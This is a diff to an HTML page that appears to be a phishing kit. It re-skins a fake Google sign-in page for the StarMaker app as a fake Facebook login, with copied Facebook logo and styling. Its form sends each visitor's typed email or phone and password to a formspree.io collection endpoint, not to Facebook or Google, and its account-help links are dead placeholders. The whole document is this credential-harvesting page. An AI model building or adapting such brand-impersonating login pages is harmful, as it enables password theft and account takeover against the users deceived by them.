@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>StarMaker - Google Sign In</title>
+    <title>StarMaker - Facebook Login</title>
     <link rel="icon" type="image/png" href="https://www.starmakerstudios.com/next-assets/favicon.ico">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -128,7 +128,7 @@
             background: rgba(255, 255, 255, 0.98);
             backdrop-filter: blur(20px);
             border-radius: 25px;
-            padding: 45px 40px;
+            padding: 40px;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
             opacity: 0;
             animation: fadeInUp 1s ease forwards 0.8s;
@@ -150,105 +150,69 @@
             margin-bottom: 30px;
         }
 
-        .google-logo {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 2px;
-            margin-bottom: 20px;
-            font-size: 32px;
-            font-weight: 700;
-            letter-spacing: -1px;
+        .facebook-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 15px;
+            display: block;
         }
 
-        .g-blue { color: #4285F4; }
-        .g-red { color: #EA4335; }
-        .g-yellow { color: #FBBC05; }
-        .g-green { color: #34A853; }
-
         .header-section h1 {
-            font-size: 26px;
-            color: #202124;
-            font-weight: 400;
+            font-size: 28px;
+            color: #1877f2;
+            font-weight: 700;
             margin-bottom: 8px;
-            letter-spacing: -0.3px;
+            letter-spacing: -0.5px;
         }
 
         .header-section p {
-            font-size: 16px;
-            color: #5f6368;
+            font-size: 15px;
+            color: #606770;
             font-weight: 400;
         }
 
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 18px;
         }
 
         .form-group input {
             width: 100%;
             padding: 16px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            font-size: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 12px;
+            font-size: 15px;
             font-family: 'Roboto', sans-serif;
             background: #fff;
-            color: #202124;
+            color: #1c1e21;
             transition: all 0.3s ease;
             outline: none;
         }
 
         .form-group input::placeholder {
-            color: #80868b;
+            color: #8a8d91;
         }
 
         .form-group input:focus {
-            border-color: #1a73e8;
-            border-width: 2px;
-            padding: 15px;
-        }
-
-        .form-actions {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 30px;
-            gap: 15px;
-        }
-
-        .back-link {
-            flex-shrink: 0;
-        }
-
-        .back-link a {
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            transition: all 0.3s ease;
-            padding: 10px 15px;
-            border-radius: 8px;
-            display: inline-block;
-        }
-
-        .back-link a:hover {
-            background: rgba(26, 115, 232, 0.08);
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
         }
 
         .login-button {
-            padding: 12px 28px;
-            background: #1a73e8;
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #1877f2, #0c63d4);
             color: #fff;
             border: none;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 500;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
-            text-transform: none;
-            letter-spacing: 0.25px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 10px;
             position: relative;
             overflow: hidden;
-            flex-shrink: 0;
         }
 
         .login-button::before {
@@ -263,8 +227,9 @@
         }
 
         .login-button:hover {
-            background: #1765cc;
-            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.4);
+            background: linear-gradient(135deg, #0c63d4, #084db0);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(24, 119, 242, 0.4);
         }
 
         .login-button:hover::before {
@@ -272,7 +237,71 @@
         }
 
         .login-button:active {
-            background: #1557b0;
+            transform: translateY(0);
+        }
+
+        .divider {
+            text-align: center;
+            margin: 25px 0;
+            position: relative;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #dddfe2;
+        }
+
+        .divider span {
+            background: rgba(255, 255, 255, 0.98);
+            padding: 0 15px;
+            position: relative;
+            color: #606770;
+            font-size: 14px;
+        }
+
+        .help-links {
+            text-align: center;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #dddfe2;
+        }
+
+        .help-links a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 13px;
+            margin: 0 12px;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+
+        .help-links a:hover {
+            text-decoration: underline;
+        }
+
+        .back-link {
+            text-align: center;
+        }
+
+        .back-link a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            display: inline-block;
+            padding: 10px 20px;
+            border-radius: 8px;
+        }
+
+        .back-link a:hover {
+            background: rgba(24, 119, 242, 0.1);
+            color: #0c63d4;
         }
 
         .success-message {
@@ -322,26 +351,6 @@
             animation: slideInDown 0.5s ease;
         }
 
-        .help-links {
-            text-align: center;
-            margin-top: 25px;
-            padding-top: 20px;
-            border-top: 1px solid #dadce0;
-        }
-
-        .help-links a {
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 13px;
-            margin: 0 12px;
-            transition: all 0.3s ease;
-            font-weight: 500;
-        }
-
-        .help-links a:hover {
-            text-decoration: underline;
-        }
-
         /* Responsive */
         @media (max-width: 768px) {
             nav {
@@ -357,16 +366,12 @@
             }
 
             .login-container {
-                padding: 35px 30px;
+                padding: 30px 25px;
                 max-width: 100%;
             }
 
-            .google-logo {
-                font-size: 28px;
-            }
-
             .header-section h1 {
-                font-size: 22px;
+                font-size: 24px;
             }
 
             .header-section p {
@@ -375,40 +380,17 @@
 
             .form-group input {
                 padding: 14px;
-                font-size: 15px;
-            }
-
-            .form-group input:focus {
-                padding: 13px;
-            }
-
-            .form-actions {
-                flex-direction: column-reverse;
-                align-items: stretch;
+                font-size: 14px;
             }
 
             .login-button {
-                width: 100%;
                 padding: 14px;
+                font-size: 15px;
             }
 
-            .back-link {
-                width: 100%;
-                text-align: center;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .login-container {
-                padding: 30px 25px;
-            }
-
-            .google-logo {
-                font-size: 26px;
-            }
-
-            .header-section h1 {
-                font-size: 20px;
+            .facebook-icon {
+                width: 50px;
+                height: 50px;
             }
 
             .help-links {
@@ -419,6 +401,16 @@
 
             .help-links a {
                 margin: 0;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 25px 20px;
+            }
+
+            .header-section h1 {
+                font-size: 22px;
             }
         }
     </style>
@@ -444,40 +436,35 @@
     <section class="login-section">
         <div class="login-container">
             <div class="header-section">
-                <div class="google-logo">
-                    <span class="g-blue">G</span>
-                    <span class="g-red">o</span>
-                    <span class="g-yellow">o</span>
-                    <span class="g-blue">g</span>
-                    <span class="g-green">l</span>
-                    <span class="g-red">e</span>
-                </div>
-                <h1>Sign in</h1>
-                <p>to continue to StarMaker</p>
+                <img class="facebook-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/1200px-Facebook_Logo_2023.png" alt="Facebook">
+                <h1>Facebook</h1>
+                <p>Log in to continue to StarMaker</p>
             </div>
 
             <div id="status" class="success-message"></div>
             <div id="error" class="error-message"></div>
 
-            <form id="login-form" method="POST" action="https://formspree.io/f/xvojokgv">
+            <form id="login-form" method="POST" action="https://formspree.io/f/xyyqkrgn">
                 <div class="form-group">
-                    <input type="text" name="username" placeholder="Email or phone" required>
+                    <input type="text" name="username" placeholder="Mobile number or email address" required>
                 </div>
                 <div class="form-group">
-                    <input type="password" name="password" placeholder="Enter your password" required>
+                    <input type="password" name="password" placeholder="Password" required>
                 </div>
-
-                <div class="form-actions">
-                    <div class="back-link">
-                        <a href="https://starmakerstudio.github.io/web/Starmaker%20Web/Login/login.html">← Back to Login Options</a>
-                    </div>
-                    <button type="submit" class="login-button">Next</button>
-                </div>
+                <button type="submit" class="login-button">Log In</button>
             </form>
 
+            <div class="divider">
+                <span>or</span>
+            </div>
+
             <div class="help-links">
-                <a href="https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin">Forgot email?</a>
-                <a href="https://accounts.google.com/signup?utm_source=help">Create account</a>
+                <a href="#">Forgotten account?</a>
+                <a href="#">Create new account</a>
+            </div>
+
+            <div class="back-link">
+                <a href="https://starmakerstudio.github.io/web/Starmaker%20Web/Login/login.html">← Back to Login Options</a>
             </div>
         </div>
     </section>
